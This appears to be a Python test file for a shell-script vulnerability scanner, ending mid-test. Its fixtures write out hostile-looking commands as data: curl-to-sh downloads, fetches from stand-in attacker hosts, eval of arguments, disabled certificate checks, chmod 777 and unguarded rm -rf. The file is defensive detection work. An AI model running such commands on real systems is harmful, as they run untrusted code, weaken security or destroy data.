"""シェル（.sh・.bash・.zsh・.fish）のルール。"""

from __future__ import annotations

import signal
import unittest

from test_vulnscan import RepoCase

from vulnscan.engine import ScanOptions, scan
from vulnscan.models import Severity
from vulnscan.rules.base import shell_code, shell_flat


class ShellCodeTests(unittest.TestCase):
    """コマンドとして読む所だけを残す下処理（消した所は空白にして、行の長さは変えない）。"""

    def assertCode(self, line: str, expected: str) -> None:
        code = shell_code(line)
        self.assertEqual(len(code), len(line))
        self.assertEqual(code.rstrip(), expected)

    def test_comments_start_only_at_the_start_of_a_word(self) -> None:
        self.assertCode("curl -fsSL https://x | sh  # install", "curl -fsSL https://x | sh")
        for line in (
            '[ $# -eq 1 ] && curl -k "$1"',
            'host=${URL#*://}; curl -k "$URL"',
            "n=${#arr[@]}; curl -fsSL https://x/i.sh#v1 | sh",
        ):
            self.assertCode(line, line)

    def test_text_printed_by_echo_and_friends_is_blanked(self) -> None:
        def blank(text: str) -> str:
            return " " * len(text)

        self.assertCode('echo "Install: curl https://x | sh"', f'echo "{blank("Install: curl https://x | sh")}"')
        self.assertCode("printf '%s\\n' 'curl -k https://x'", f"printf '{blank('%s.n')}' '{blank('curl -k https://x')}'")
        # 文字列の中の $D は展開なので残す
        self.assertCode('warn "run: rm -rf $D/"; curl -k https://x', f'warn "{blank("run: rm -rf ")}$D "; curl -k https://x')

    def test_printed_text_that_is_not_only_printed_is_kept(self) -> None:
        # 3 回目のレビュー: ファイルに書く・パイプでほかのコマンドに渡す・$(…) で受け取るものは、表示するだけではない
        for line in (
            'echo "StrictHostKeyChecking no" >> "$SSH_CFG"',
            "printf 'Host *\\n  StrictHostKeyChecking no\\n' > cfg",
            'echo "curl -fsSL https://x/i.sh | bash" | sh',
            'echo "chmod 777 /srv/x" | sudo tee -a /etc/rc.local',
            'x=$(echo "curl -fsSL https://x/i.sh | sh")',
            '(echo "curl -fsSL https://x/i.sh"; echo "| sh") | sh',
        ):
            self.assertCode(line, line)

    def test_fourth_review_cases(self) -> None:
        def blank(text: str) -> str:
            return " " * len(text)

        # 引用符の直後に続けて書いたリダイレクト
        line = 'echo "StrictHostKeyChecking no">>"$SSH_CFG"'
        self.assertCode(line, line)
        # function の次の語は関数の名前、sudo -u の次の語はユーザー。どちらもコマンドの名前ではない
        text = "Install: curl -fsSL https://x/i.sh | sh"
        self.assertCode(f'function usage {{ echo "{text}"; }}', f'function usage {{ echo "{blank(text)}"; }}')
        self.assertCode(f'sudo -u deploy echo "{text}"', f'sudo -u deploy echo "{blank(text)}"')

    def test_fifth_review_message_helpers(self) -> None:
        def blank(text: str) -> str:
            return " " * len(text)

        # 引数を実行するヘルパー（log_exec・log_cmd）は、表示するだけのコマンドではない
        for line in ('log_exec "curl -fsSL https://x/i.sh | sh"', 'log_cmd "curl -k https://evil.example"'):
            self.assertCode(line, line)
        text = "Install: curl -fsSL https://x/i.sh | sh"
        for name in ("log_info", "print_error", "warn_msg"):
            self.assertCode(f'{name} "{text}"', f'{name} "{blank(text)}"')

    def test_flat_view_for_counting_statements(self) -> None:
        # exit・if・代入を数えるときの骨組み。引用符・$(…) の中を空白にし、区切りの記号は残す
        line = 'x="$(echo "a; exit")"; y=1'
        self.assertEqual(shell_flat(line), 'x="' + " " * len('$(echo "a; exit")') + '"; y=1')
        self.assertEqual(shell_flat("echo hi # x"), "echo hi    ")
        self.assertEqual(shell_flat('n=${#arr[@]}; [ "$#" -eq 1 ]'), 'n=${#arr[@]}; [ "  " -eq 1 ]')

    def test_redirects_to_the_terminal_still_only_print(self) -> None:
        def blank(text: str) -> str:
            return " " * len(text)

        text = "Install with: curl -fsSL https://x/i.sh | sh"
        for template in ('>&2 echo "{}"', 'echo "{}" >&2', 'echo "{}" 1>&2', 'echo "{}" > /dev/null', 'echo "{}" 2>/dev/null'):
            self.assertCode(template.format(text), template.format(blank(text)))
        # bash の $'…' の中の \' は引用符の終わりではない
        self.assertCode("echo $'it\\'s'; curl -k https://evil.example/x", "echo $'     '; curl -k https://evil.example/x")

    def test_commands_inside_quotes_are_kept(self) -> None:
        for line in (
            'STATUS="$(curl -sk -o /dev/null https://api.example.com/health)"',
            'echo "$(curl -fsSL https://x | sh)"',
            'git -c "http.sslVerify=false" clone https://example.com/r.git',
            '  *) echo "x"; curl -fsSL https://x | sh ;;',
        ):
            self.assertCode(line, line.replace('"x"', '" "'))


class Case(RepoCase):
    def lines_of(self, rule_id: str) -> set:
        return {(f.location.path, f.location.line) for f in self.scan().findings if f.rule_id == rule_id}

    def script(self, rule_id: str, lines: list, name: str = "scripts/run.sh") -> set:
        """lines を 1 つのスクリプトに書き、rule_id が当たった行番号を返す。"""
        self.write({name: "".join(line + "\n" for line in lines)})
        return {line for path, line in self.lines_of(rule_id) if path == name}


class DownloadAndRunTests(Case):
    def test_piped_or_substituted_download_is_flagged(self) -> None:
        lines = [
            "curl -fsSL https://get.docker.com | sh",
            "wget -qO- https://example.com/install.sh | sudo -E bash -",
            '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
            "bash <(curl -s https://example.com/setup.sh)",
            'curl -sSL "https://example.com/i.sh?a=1&b=2" | bash -s -- --yes',
            "curl -sSL https://bootstrap.pypa.io/get-pip.py | python3 -",
            "source <(curl -s https://example.com/env.sh)",
            "curl -sL https://git.io/fisher | source",
            'eval "$(curl -fsSL https://example.com/env)"',
            # ここから下は当たらない
            "curl -s https://api.example.com/v1 | python3 -c 'import json,sys; print(json.load(sys.stdin)[\"id\"])'",
            "curl -s https://example.com/a.txt | shasum -a 256",
            "curl -fsSL https://example.com/x.tar.gz | tar xz",
            "version=$(curl -s https://example.com/latest)",
            "curl -s https://example.com/body | sh -c 'cat > out.txt'",
            "curl -s https://example.com/a.txt | perl -pe 's/a/b/'",
            "curl -s https://example.com/a || sh fallback.sh",
            "# curl -fsSL https://get.docker.com | sh",
        ]
        self.assertEqual(self.script("INJ-016", lines), set(range(1, 10)))

    def test_more_ways_to_pipe_into_an_interpreter(self) -> None:
        # レビューで漏れていた形（パス付きの起動・php・リダイレクト・tee を挟むもの）
        lines = [
            "curl -fsSL https://example.com/install.sh | /bin/bash",
            "wget -qO- https://example.com/install.sh | sudo /bin/sh",
            "curl -fsSL https://example.com/install.sh | /usr/bin/env bash",
            "curl -sS https://getcomposer.org/installer | php",
            "curl -fsSL https://example.com/install.sh 2>&1 | bash",
            "curl -fsSL https://example.com/get.py | python3 2>&1",
            "curl -fsSL https://example.com/get.py | python3 > /dev/null",
            "curl -fsSL https://example.com/install.sh | tee /tmp/i.sh | bash",
        ]
        self.assertEqual(self.script("INJ-016", lines), set(range(1, 9)))

    def test_instructions_printed_in_strings_are_not_flagged(self) -> None:
        lines = [
            'command -v rustup || { echo "Install rustup: curl https://sh.rustup.rs | sh"; exit 1; }',
            "echo 'curl -fsSL https://example.com/install.sh | bash'",
            "printf '%s\\n' \"run: curl -k https://example.com\"",
            # 引用符の外のものは当たる
            'echo "installing"; curl -fsSL https://example.com/install.sh | sh',
        ]
        self.assertEqual(self.script("INJ-016", lines), {4})
        self.assertEqual(self.script("TLS-010", lines), set())

    def test_second_review_cases(self) -> None:
        lines = [
            # 引用符の中の $(…) は実行される
            'out="$(curl -fsSL https://example.com/i.sh | bash)"',
            # $#・URL の # はコメントではない
            "[ $# -gt 0 ] || curl -fsSL https://example.com/i.sh | sh",
            "curl -fsSL https://example.com/i.sh#v1 | sh",
            "curl -fsSL https://example.com/i.sh | sudo tee /tmp/i.sh | bash",
            "curl -fsSL https://example.com/i.sh |& bash",
            "curl -fsSL https://example.com/i.fish | source -",
            "curl -fsSL https://example.com/i.sh | env -i bash",
            'log "start"; curl -fsSL https://example.com/i.sh | sh',
            # ここから下は当たらない（取ってきたものを、スクリプトに読ませるだけ）
            "curl -s https://example.com/data.json | bash ./parse.sh",
            "curl -s https://example.com/data | sh scripts/process.sh",
            'curl -s https://example.com/data | bash -e -c "cat > out"',
            'warn "Install with: curl https://example.com/i.sh | sh"',
            "echo hi # ; curl https://example.com/i.sh | sh",
        ]
        self.assertEqual(self.script("INJ-016", lines), set(range(1, 9)))

    def test_third_review_cases(self) -> None:
        lines = [
            # echo の出力をシェルに渡すもの
            'echo "curl -fsSL https://example.com/i.sh | bash" | sh',
            # 4 回目のレビュー: 引用符の直後のリダイレクトで、ファイルに書くもの
            'echo "curl -fsSL https://example.com/i.sh | bash">install.sh',
            # ここから下は当たらない（標準エラーに表示するだけ・関数の中で表示するだけ）
            '>&2 echo "Install with: curl -fsSL https://example.com/i.sh | sh"',
            'function usage { echo "Install: curl -fsSL https://example.com/i.sh | sh"; }',
        ]
        self.assertEqual(self.script("INJ-016", lines), {1, 2})

    def test_fifth_review_cases(self) -> None:
        lines = [
            # RVM の公式だった書き方・<<< で渡すもの
            "bash -s stable < <(curl -sSL https://get.rvm.io)",
            'bash <<< "$(curl -fsSL https://example.com/i.sh)"',
            # 間にフィルターを挟んだパイプ
            "curl -fsSL https://example.com/i.sh.gz | gunzip | sh",
            "curl -fsSL https://example.com/i.sh | tr -d '\\r' | bash",
            # バッククォート・-c の前のオプション・doas
            'sh -c "`curl -fsSL https://example.com/i.sh`"',
            "eval `curl -fsSL https://example.com/env`",
            'bash -e -c "$(curl -fsSL https://example.com/i.sh)"',
            "curl -fsSL https://example.com/i.sh | doas sh",
            # 引数を実行するヘルパー
            'log_exec "curl -fsSL https://example.com/i.sh | sh"',
            # ここから下は当たらない
            "curl -s https://example.com/a.txt | grep foo | wc -l",
            'log_info "Install: curl -fsSL https://example.com/i.sh | sh"',
            "curl -s https://example.com/a || sh fallback.sh",
        ]
        self.assertEqual(self.script("INJ-016", lines), set(range(1, 10)))

    def test_heredoc_bodies(self) -> None:
        # cat に渡すヒアドキュメントはデータ。bash・ssh などに渡すものは、そのシェルが実行する
        lines = [
            "cat <<EOF",
            "Run: curl -fsSL https://example.com/i.sh | sh",
            "EOF",
            "bash <<'EOF'",
            "curl -fsSL https://example.com/i.sh | sh",
            "EOF",
            "ssh deploy@example.com <<-EOF",
            "\tcurl -fsSL https://example.com/i.sh | sh",
            "\tEOF",
        ]
        self.assertEqual(self.script("INJ-016", lines), {5, 8})

    def test_other_languages_are_not_checked(self) -> None:
        # Dockerfile の RUN と README の手順は対象外（シェルのファイルだけを見る）
        self.write(
            {
                "Dockerfile": "RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n",
                "README.md": "curl -fsSL https://example.com/install.sh | sh\n",
            }
        )
        self.assertEqual(self.lines_of("INJ-016"), set())


class EvalArgumentsTests(Case):
    def test_arguments_passed_to_eval_or_sh_c(self) -> None:
        lines = [
            'run() { echo "+ $*"; eval "$*"; }',
            'eval "$@"',
            'bash -c "$1"',
            "eval $1",
            'sh -c "${2}" _ "$3"',
            # ここから下は当たらない
            'eval "$(ssh-agent -s)"',
            'eval "$1=\\$value"',
            '"$@"',
            "find . -name '*.log' -exec sh -c 'gzip \"$1\"' _ {} \\;",
            'eval "$(brew shellenv)"',
            'eval "$wrapper () { __git_func_wrap $2 ; }"',
        ]
        self.assertEqual(self.script("INJ-017", lines), {1, 2, 3, 4, 5})

    def test_assignment_with_unescaped_value_and_single_quotes(self) -> None:
        lines = [
            # $2 が eval の前に展開されるので、x; rm -rf ~ がそのまま動く
            'set_var() { eval "$1=$2"; }',
            # ここから下は当たらない（単一引用符の中の $1・$@ は展開されるだけで、値の中の ; や $(…) は読み直されない）
            "sh -c '$1' _ \"$cmd\"",
            "eval '$@'",
            # 2 回目のレビュー: 値を \" で囲んでも、$2 は eval の前に展開される
            'set_var() { eval "$1=\\"$2\\""; }',
        ]
        self.assertEqual(self.script("INJ-017", lines), {1, 4})


class InsecureTransportTests(Case):
    def test_certificate_checks_turned_off(self) -> None:
        lines = [
            "curl -sk https://api.example.com/health",
            "curl --insecure -o out.json https://example.com/data",
            "wget --no-check-certificate https://example.com/a.zip",
            "git config --global http.sslVerify false",
            "export GIT_SSL_NO_VERIFY=true",
            "npm config set strict-ssl false",
            "pip install --trusted-host pypi.example.com -r requirements.txt",
            "git -c http.sslVerify=false clone https://example.com/r.git",
            'curl -H "Accept: a|b" -k https://example.com',
            # ここから下は当たらない
            "curl -sk https://localhost:8443/health",
            "curl -k https://127.0.0.1/api",
            "curl -s https://api.example.com | sort -k2",
            'curl -H "X-Api-Key: $KEY" https://api.example.com',
            "curl --max-time 10 --keepalive-time 5 https://example.com",
            "git config http.sslVerify true",
            "unset GIT_SSL_NO_VERIFY",
        ]
        self.assertEqual(self.script("TLS-010", lines), set(range(1, 10)))

    def test_more_spellings_of_turning_checks_off(self) -> None:
        # git の設定の名前は大文字小文字を区別せず、真偽は 0・no・off も受け付ける。URL ごとの設定もある
        lines = [
            "git config --global http.sslverify false",
            "git config http.sslVerify 0",
            "git config http.https://git.example.com/.sslVerify false",
            "npm config set strict-ssl=false",
            "npm set strict-ssl false",
            # localhost を名前の一部に含むだけのもの・同じ行の別のコマンド・行末のコメント
            "curl -k https://localhost.attacker.example/p -o x.sh",
            "curl -k https://api.example.com && curl http://localhost:8080/ready",
            'curl -sk "$URL" -o out  # was localhost',
        ]
        self.assertEqual(self.script("TLS-010", lines), set(range(1, 9)))

    def test_second_review_cases(self) -> None:
        lines = [
            # 引用符の中の $(…)・$#・${x#…}
            'STATUS="$(curl -sk -o /dev/null -w "%{http_code}" https://api.example.com/health)"',
            'if [ "$(curl -sk https://api.example.com/ok)" = ok ]; then :; fi',
            '[ $# -eq 1 ] && curl -k "$1"',
            'host=${URL#*://}; curl -k "$URL"',
            # 同じ行のほかの所にある localhost で外さない
            "git config --global http.sslVerify false && curl http://localhost:8080/ready",
            "export GIT_SSL_NO_VERIFY=1; curl -s http://localhost:8080/",
            "npm config set strict-ssl false  # registry at http://localhost:4873",
            'curl -k -H "Origin: http://localhost:3000" "$API_URL/x"',
            'curl -k "$URL"  # e.g. https://localhost:8443',
            "curl -k https://localhost@evil.example/x.sh",
            'git -c "http.sslVerify=false" clone https://example.com/r.git',
            # ここから下は当たらない（表示するだけの文字列）
            'echo "git config http.sslVerify false"',
            "echo 'set GIT_SSL_NO_VERIFY=1 to skip'",
        ]
        self.assertEqual(self.script("TLS-010", lines), set(range(1, 12)))

    def test_third_review_cases(self) -> None:
        lines = [
            'echo "GIT_SSL_NO_VERIFY=1" >> "$GITHUB_ENV"',
            # 引用符の中のほかの宛先・変数
            'curl -k -x http://127.0.0.1:8080 "https://api.example.com/"',
            'curl -k https://localhost:8443/a "https://evil.example/b"',
            'curl -k "${API}/x" -e https://localhost/',
            # localhost:… の部分はユーザー名とパスワードで、つなぐ先は evil.example
            "curl -k https://localhost:pw@evil.example/x.sh",
            "curl -k https://127.0.0.1:8443@evil.example/x.sh",
            "echo $'it\\'s'; curl -k https://evil.example/x",
            # 4 回目のレビュー: バッククォートで渡す宛先・引用符の中の & のあとの宛先
            "curl -k https://localhost/ `cat urls`",
            'curl -k https://localhost/ -d "a=1&b=2" https://evil.example',
            # ここから下は当たらない（引用符の中でも、宛先は手元だけ・sudo -u のあとの echo で表示するだけ）
            'curl -k "https://localhost:8443/health"',
            'sudo -u deploy echo "Try: curl -k https://example.com"',
        ]
        self.assertEqual(self.script("TLS-010", lines), set(range(1, 10)))

    def test_fifth_review_cases(self) -> None:
        lines = [
            'log_cmd "curl -k https://evil.example"',
            # pip は、index の URL が手元でも、信頼するホストは手元ではない
            "pip install -i http://localhost:8080/simple --trusted-host pypi.example.com",
        ]
        self.assertEqual(self.script("TLS-010", lines), {1, 2})

    def test_ssh_config_written_by_a_block(self) -> None:
        # { …; }・for … done・if … fi の出力をまとめてファイルに書くもの、exec > のあとの echo
        lines = [
            '{ echo "Host *"; echo "  StrictHostKeyChecking no"; } >> "$HOME/.ssh/config"',
            'for h in a b; do echo "  StrictHostKeyChecking no"; done >> cfg',
            'if true; then echo "  StrictHostKeyChecking no"; fi >> cfg',
            "{",
            '  echo "StrictHostKeyChecking no"',
            "} >> cfg",
            'exec >> "$SSH_CONFIG"',
            'echo "StrictHostKeyChecking no"',
        ]
        self.assertEqual(self.script("TLS-011", lines), {1, 2, 3, 5, 8})
        # 標準エラーに出すだけのものは当たらない
        lines = ['{ echo "add StrictHostKeyChecking no"; } >&2']
        self.assertEqual(self.script("TLS-011", lines, name="scripts/hint.sh"), set())

    def test_ssh_config_written_with_echo(self) -> None:
        lines = [
            'echo "StrictHostKeyChecking no" >> "$SSH_CFG"',
            "printf 'Host *\\n  StrictHostKeyChecking no\\n' > cfg",
            'echo "StrictHostKeyChecking no">>"$SSH_CFG"',
        ]
        self.assertEqual(self.script("TLS-011", lines), {1, 2, 3})

    def test_in_test_scripts_is_low(self) -> None:
        self.write({"tests/smoke.sh": "curl -k https://staging.example.com/health\n"})
        (finding,) = [f for f in self.scan().findings if f.rule_id == "TLS-010"]
        self.assertEqual(finding.severity.label, "low")

    def test_ssh_host_key_checks_turned_off(self) -> None:
        lines = [
            "ssh -o StrictHostKeyChecking=no deploy@example.com 'systemctl restart app'",
            'scp -o "StrictHostKeyChecking no" app.tar deploy@example.com:/srv/',
            "rsync -e 'ssh -o StrictHostKeyChecking=off' -a dist/ deploy@example.com:/srv/",
            # ここから下は当たらない
            "ssh -o StrictHostKeyChecking=accept-new deploy@example.com true",
            "ssh -o StrictHostKeyChecking=yes deploy@example.com true",
            "ssh -oStrictHostKeyChecking=no deploy@example.com true",
            # OpenSSH は false も off と同じに読む
            "ssh -o StrictHostKeyChecking=false deploy@example.com true",
            'echo "add -o StrictHostKeyChecking=no if it hangs"',
        ]
        self.assertEqual(self.script("TLS-011", lines), {1, 2, 3, 6, 7})


class CaseBranchTests(Case):
    def test_case_default_branch_is_not_a_comment(self) -> None:
        # *) で始まる行を、JavaScript の /* … */ の続きの行と同じ扱いで読み飛ばしていた
        self.write(
            {
                "scripts/setup.sh": 'case "$(uname)" in\n'
                "  Darwin) brew install jq ;;\n"
                "  *) curl -fsSL https://example.com/install.sh | sh ;;\n"
                "esac\n"
                'case "$1" in\n'
                '  *) eval "$@" ;;\n'
                "  *.tar) curl -k https://example.com/a.tar ;;\n"
                "  *) chmod 777 /srv/x ;;\n"
                "esac\n"
            }
        )
        found = {(f.rule_id, f.location.line) for f in self.scan().findings}
        self.assertLessEqual({("INJ-016", 3), ("INJ-017", 6), ("TLS-010", 7), ("CFG-017", 8)}, found)


class WorldWritableTests(Case):
    def test_modes_anyone_can_write(self) -> None:
        lines = [
            "chmod 777 /var/run/app.sock",
            "chmod -R 0777 storage",
            "chmod a+w shared",
            "chmod u+x,o+w file",
            "umask 000",
            'chmod 666 "$LOG"',
            "sudo chmod 2777 /srv/drop",
            # ここから下は当たらない
            "chmod 755 bin/tool",
            "chmod 1777 /tmp/shared",
            "chmod +w file",
            "chmod 0644 a",
            "umask 022",
            "chmod 775 dir",
            "chmod g+w dir",
            # 2 回目のレビュー: あとの o-w で書き込みを外したもの
            "chmod a+rw,o-w file",
            "chmod -- 777 /srv/x",
            # 3 回目のレビュー: 起動時に実行するファイルに書き込むもの
            'echo "chmod 777 /srv/x" | sudo tee -a /etc/rc.local',
        ]
        self.assertEqual(self.script("CFG-017", lines), {*range(1, 8), 16, 17})

    def test_fifth_review_cases(self) -> None:
        lines = [
            # 作るときに権限を付けるもの・引用符つき・2 桁のモード
            "mkdir -m 777 /srv/shared",
            "install -m 0777 x /usr/local/bin/x",
            "mkdir --mode=777 /srv/drop",
            "mkdir -p -m a+w /srv/drop",
            'chmod "777" x',
            "chmod 66 x",
            # ここから下は当たらない
            "mkdir -m 755 /srv/app",
            "install -m 0644 a b",
            "npm install --save-dev x",
        ]
        self.assertEqual(self.script("CFG-017", lines), set(range(1, 7)))


class RemoveWithEmptyVariableTests(Case):
    def test_variable_that_may_be_empty(self) -> None:
        lines = [
            'STEAMROOT="$(cd "${0%/*}" && echo "$PWD")"',
            'rm -rf "$STEAMROOT/"*',
            'rm -rf "${BUILD_DIR}"/*',
            "rm -fr $TARGET/",
            'sudo rm -rf "$PREFIX/"',
            'rm -r -f -- "$OUT"/',
            # ここから下は当たらない
            'rm -rf "${OUT:?}/"*',
            '[ -n "$DIR" ] && rm -rf "$DIR/"*',
            'rm -rf "$DIR/build"',
            'rm -rf "$tmp"',
            'rm "$DIR/"',
            '# rm -rf "$X/"*',
            'git rm -r --cached "$VENDOR/"',
        ]
        self.assertEqual(self.script("CFG-018", lines), {2, 3, 4, 5, 6})

    def test_variable_set_to_a_literal_in_the_same_file(self) -> None:
        # gcloud の python_environment_unpack.sh（定数を入れた変数の中を消している）
        lines = [
            'LOCAL_TMP_DIR="/tmp/init_action_archive"',
            "readonly STAGE=build/stage",
            'CACHE="${XDG_CACHE_HOME:-$HOME/.cache}/app"',
            'rm -rf "${LOCAL_TMP_DIR}"/*',
            'rm -rf "$STAGE/"*',
            'rm -rf "$CACHE"/*',
            # 文字列の定数のあとで、外から読んだ値を入れ直すもの
            'DEST="/srv/app"',
            'read -r DEST',
            'DEST="$1"',
            'rm -rf "$DEST/"*',
        ]
        self.assertEqual(self.script("CFG-018", lines), {10})

    def flagged_files(self, scripts: dict) -> set:
        """1 つの場面を 1 つのファイルに書き（確かめ方はファイル全体で見るため）、CFG-018 が当たったファイルを返す。"""
        self.write({f"scripts/{name}.sh": "".join(line + "\n" for line in body) for name, body in scripts.items()})
        return {path.split("/")[-1][:-3] for path, _line in self.lines_of("CFG-018")}

    def test_checks_that_do_not_guard_the_rm(self) -> None:
        # レビューで、確かめていないのに外していた形
        scripts = {
            "echo_n": ['echo -n "$DIR" > f', 'rm -rf "$DIR/"*'],
            "tail_n": ['tail -n "$1" log', 'rm -rf "$1/"*'],
            "check_after": ['rm -rf "$T/"*', '[ -n "$T" ] || exit 1'],
            "in_comment": ['# TODO [ -n "$TARGET" ]', 'rm -rf "$TARGET/"*'],
            "reversed": ['[ -z "$D" ] && rm -rf "$D/"*'],
        }
        self.assertEqual(self.flagged_files(scripts), set(scripts))

    def test_checks_that_guard_the_rm(self) -> None:
        scripts = {
            "or_exit": ['[ -n "$G" ] || exit 1', 'rm -rf "$G/"*'],
            "if_z_exit": ['if [ -z "$H" ]; then', '  echo "H is empty"', "  exit 1", "fi", 'rm -rf "$H/"*'],
            "if_n_block": ['if [ -n "$I" ]; then', '  rm -rf "$I/"*', "fi"],
            "colon_q": [': "${J:?}"', 'rm -rf "$J/"*'],
            "z_default": ['[ -z "$K" ] && K=/tmp/k', 'rm -rf "$K/"*'],
        }
        self.assertEqual(self.flagged_files(scripts), set())

    def test_values_that_may_still_be_empty(self) -> None:
        scripts = {
            "default_var": ['DEST="${1:-$INSTALL_DIR}"', 'rm -rf "$DEST/"*'],
            "env_prefix": ["DESTDIR=/tmp/stage make install", 'rm -rf "$DESTDIR/"*'],
            "make_arg": ["make PREFIX=/usr/local install", 'rm -rf "$PREFIX/"*'],
            "if_only": ["if [ -d /x ]; then DIR=/x; fi", 'rm -rf "$DIR/"*'],
            "unset": ["WORK=/tmp/w", "unset WORK", 'rm -rf "$WORK/"*'],
            "subshell": ['(rm -rf "$SUB/"*)'],
            "substitution": ['x=$(rm -rf "$SUB2"/)'],
        }
        self.assertEqual(self.flagged_files(scripts), set(scripts))

    def test_values_that_cannot_be_empty(self) -> None:
        scripts = {
            # ROOT が空でも消えるのは /dist/* だけ
            "fixed_tail": ['ROOT="$(pwd)"', 'OUT="$ROOT/dist"', 'rm -rf "$OUT"/*'],
            "aws_s3": ['aws s3 rm "$S3_PREFIX/" --recursive'],
            "colon_assign": [': "${CACHE:=/tmp/x}"', 'rm -rf "$CACHE/"*'],
        }
        self.assertEqual(self.flagged_files(scripts), set())

    def test_second_review_misses(self) -> None:
        scripts = {
            # 代入より前の rm
            "assigned_after": ['rm -rf "$OUT/"*', "OUT=/tmp/out"],
            # -z のあとの exit が rm を守っていない（関係のない exit・rm のあと・文字列の中）
            "z_echo_exit_later": ['[ -z "$D" ] && echo warn', 'rm -rf "$D/"*', "exit 0"],
            "z_rm_exit_later": ['[ -z "$D" ] && rm -rf "$D/"*', "exit 0"],
            "z_exit_in_string": ['[ -z "$D" ] && echo "D empty"', 'echo "press q to exit"', 'rm -rf "$D/"*'],
            "z_sets_from_arg": ['if [ -z "$T" ]; then T="$1"; fi', 'rm -rf "$T/"*'],
            # -n の向き
            "n_or_rm": ['[ -n "$D" ] || rm -rf "$D/"*'],
            "n_then_echo": ['[ -n "$D" ] && echo set', 'rm -rf "$D/"*'],
            # 関数・{ … } の中の代入と、echo done で深さを数え違えていたもの
            "in_function": ["setup() {", "  BUILD=/tmp/build", "}", 'rm -rf "$BUILD/"*'],
            "in_brace_group": ["[ -d /x ] && {", "  DIR=/x", "}", 'rm -rf "$DIR/"*'],
            "echo_done_in_if": ["if [ -d /x ]; then", "  echo done", "  DIR=/x", "fi", 'rm -rf "$DIR/"*'],
            # rm の引数の途中の rm という語で止まっていた
            "rm_word_in_path": ['rm -rf /tmp/rm "$D/"*'],
            # コマンドの位置の rm
            "if_rm": ['if rm -rf "$D/"*; then :; fi'],
            "bang_rm": ['! rm -rf "$D/"*'],
            "backslash_rm": ['\\rm -rf "$D/"*'],
            "sudo_opts_rm": ['sudo -E rm -rf "$D/"*'],
        }
        self.assertEqual(self.flagged_files(scripts), set(scripts))

    def test_second_review_false_positives(self) -> None:
        scripts = {
            "rm_prefix_glob": ['rm -rf "$TMP"/rm-test-*'],
            "rm_dot_d": ["rm -rf $BUILD/rm.d"],
            # 値を変えない export と、読むだけのもの
            "export_bare": ["INSTALL_DIR=/opt/app", "export INSTALL_DIR", 'rm -rf "$INSTALL_DIR/"*'],
            "reads_between": [
                "DIR=/opt/app",
                "export PATH=$DIR/bin:$PATH",
                'for f in $DIR/*.log; do echo "$f"; done',
                'rm -rf "$DIR/"*',
            ],
            # 正しい確かめ方
            "z_or_rm": ['[ -z "$D" ] || rm -rf "$D/"*'],
            "if_d_rm": ['if [ -d "$D" ]; then rm -rf "$D/"*; fi'],
            # 5 回目のレビューのあとで、die・fail などは同じファイルで exit するように定義したものだけを数える
            # （定義の無い die は、exit しない関数かもしれない）。そのため die の定義を足した
            "z_die": ['die() { echo "$*" >&2; exit 1; }', '[ -z "$T" ] && die "T not set"', 'rm -rf "$T/"*'],
            # コメント・表示するだけの文字列の中の rm
            "rm_in_comment": ['echo hi # ; rm -rf "$D/"*'],
            "rm_in_echo": ['echo "then run: rm -rf $D/"'],
        }
        self.assertEqual(self.flagged_files(scripts), set())

    def test_third_review_misses(self) -> None:
        scripts = {
            # 変数から作ったパス・既定値つきの展開は、変数そのものを確かめていない
            "d_path_test": ['if [ -d "$PREFIX/bin" ]; then rm -rf "$PREFIX/"*; fi'],
            "e_path_test": ['[ -e "$D/.git" ] && rm -rf "$D/"*'],
            "n_default": ['[ -n "${D:-x}" ] && rm -rf "$D/"*'],
            # 引用符の無い [ -n $D ] は、D が空だと [ -n ] になり、いつも真
            "n_unquoted": ["[ -n $D ] && rm -rf $D/*"],
            "n_unquoted_exit": ["[ -n $D ] || exit 1", 'rm -rf "$D/"*'],
            "test_unquoted": ['test -n $D && rm -rf "$D/"*'],
            "d_unquoted_if": ['if [ -d $D ]; then rm -rf "$D/"*; fi'],
            # 固定の文字が / だけの値は、空のときに / になる
            "slash_only": ['DEST="$PREFIX/"', 'rm -rf "$DEST/"*'],
            "slash_between": ['DEST="$PREFIX/$NAME"', 'rm -rf "$DEST/"*'],
            # if [ -z ] の中の exit が、空のときに必ず通る所にない
            "nested_exit": ['if [ -z "$D" ]; then', '  if [ "$STRICT" = 1 ]; then exit 1; fi', "fi", 'rm -rf "$D/"*'],
            "elif_exit": ['if [ -z "$D" ]; then', "  echo empty", 'elif [ ! -w "$D" ]; then', "  exit 1", "fi", 'rm -rf "$D/"*'],
            "z_and_cond": ['if [ -z "$D" ] && [ -z "$E" ]; then exit 1; fi', 'rm -rf "$D/"*'],
            # if [ -n ] の else の枝・|| の条件
            "rm_in_else": ['if [ -n "$D" ]; then', "  echo ok", "else", '  rm -rf "$D/"*', "fi"],
            "n_or_cond": ['if [ -n "$D" ] || [ -n "$E" ]; then rm -rf "$D/"*; fi'],
            # 同じ行の && と || の連鎖・バックグラウンドの &
            "and_or_chain": ['[ -n "$D" ] && echo ok || rm -rf "$D/"*'],
            "or_and_chain": ['[ -z "$D" ] || echo set && rm -rf "$D/"*'],
            "background": ['[ -n "$D" ] && sleep 1 & rm -rf "$D/"*'],
            # rm の前の $SUDO・sudo -u
            "dollar_sudo": ['$SUDO rm -rf "$D/"*'],
            "sudo_user": ['sudo -u www-data rm -rf "$D/"*'],
            # 通らないかもしれない所の ${D:?}
            "assert_in_if": ['if [ "$MODE" = a ]; then : "${D:?}"; fi', 'rm -rf "$D/"*'],
            "assert_in_block": ['if [ "$MODE" = a ]; then', '  : "${D:?}"', "fi", 'rm -rf "$D/"*'],
            "exit_in_function": ["check() {", '  [ -n "$D" ] || exit 1', "}", 'rm -rf "$D/"*'],
            # 文字列の定数を入れたあとで、読み込み直すもの
            "ifs_read": ["DEST=/srv/app", "IFS= read -r DEST", 'rm -rf "$DEST/"*'],
            "printf_v": ["DEST=/srv/app", 'printf -v DEST "%s" "$1"', 'rm -rf "$DEST/"*'],
            "sourced": ["DEST=/srv/app", ". ./config.sh", 'rm -rf "$DEST/"*'],
        }
        self.assertEqual(self.flagged_files(scripts), set(scripts))

    def test_fourth_review_misses(self) -> None:
        scripts = {
            # case の別の分岐・if の else の枝で確かめたもの
            "case_arms": ['case "$1" in', "  build)", '    [ -n "$OUT" ] || exit 1', "    ;;", "  clean)", '    rm -rf "$OUT/"*', "    ;;", "esac"],
            "assert_then_else": ['if [ "$1" = a ]; then', '  : "${D:?}"', "else", '  rm -rf "$D/"*', "fi"],
